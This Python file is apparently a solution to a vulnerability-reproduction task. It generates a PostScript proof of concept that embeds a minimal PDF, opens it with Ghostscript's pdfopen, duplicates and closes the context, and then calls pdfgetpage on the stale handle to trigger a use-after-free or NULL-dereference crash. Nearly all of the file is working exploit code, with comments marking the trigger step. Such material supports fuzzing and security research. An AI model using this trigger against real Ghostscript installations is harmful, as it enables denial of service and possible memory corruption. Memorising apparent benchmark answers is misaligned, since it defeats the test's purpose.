import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a valid minimal PDF in memory.
        # This allows pdfopen to succeed, so we can obtain a context handle
        # and then manually trigger the vulnerability (Use-After-Free/NULL-deref)
        # by cloning the handle and closing one of them.
        
        # 1. Define PDF components
        header = b"%PDF-1.0\n"
        
        # Object 1: Catalog
        o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        # Object 2: Pages
        o2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        # Object 3: Page (MediaBox is required)
        o3 = b"3 0 obj\n<< /Type /Page /MediaBox [0 0 612 792] >>\nendobj\n"
        
        # 2. Calculate offsets for XREF table
        offset_1 = len(header)
        offset_2 = offset_1 + len(o1)
        offset_3 = offset_2 + len(o2)
        xref_offset = offset_3 + len(o3)
        
        # 3. Construct XREF table
        # Format: 10-digit-offset SPACE 5-digit-gen SPACE n/f SPACE (CR)LF
        # Each entry must be exactly 20 bytes.
        xref_header = b"xref\n0 4\n"
        xref_0 = b"0000000000 65535 f \n"
        xref_1 = b"%010d 00000 n \n" % offset_1
        xref_2 = b"%010d 00000 n \n" % offset_2
        xref_3 = b"%010d 00000 n \n" % offset_3
        
        xref_section = xref_header + xref_0 + xref_1 + xref_2 + xref_3
        
        # 4. Construct Trailer
        trailer = b"trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n%d\n%%EOF" % xref_offset
        
        # 5. Assemble PDF
        pdf_bytes = header + o1 + o2 + o3 + xref_section + trailer
        
        # 6. Create PostScript PoC
        # The PoC writes the PDF to a temporary file, opens it to get a pdfi context,
        # duplicates the context, closes one copy (freeing the underlying stream/resources),
        # and then attempts to use the other copy, triggering the vulnerability.
        
        ps_poc = b"%!PS\n"
        
        # Define filename and write PDF content
        ps_poc += b"/fn (poc.pdf) def\n"
        ps_poc += b"/f fn (w) file def\n"
        # Use hex string to safely embed binary data
        ps_poc += b"f <" + pdf_bytes.hex().encode() + b"> writestring\n"
        ps_poc += b"f closefile\n"
        
        ps_poc += b"\n"
        # Trigger Logic
        ps_poc += b"fn (r) file\n"     # Open file stream
        ps_poc += b"pdfopen\n"         # Create pdfi context. Stack: ctx
        ps_poc += b"dup\n"             # Duplicate context. Stack: ctx ctx
        ps_poc += b"pdfclose\n"        # Close one context. Frees internal stream. Stack: ctx
        
        # Prepare arguments for pdfgetpage: <page_num> <context>
        # Stack currently has <context>. We need <page_num> below it?
        # zpdfgetpage expects: op=context, op-1=integer.
        # So we need stack: integer context
        ps_poc += b"1 exch\n"          # Push 1, swap. Stack: 1 ctx
        ps_poc += b"pdfgetpage\n"      # Call operator on stale context -> CRASH
        
        ps_poc += b"pop\n"
        ps_poc += b"quit\n"
        
        return ps_poc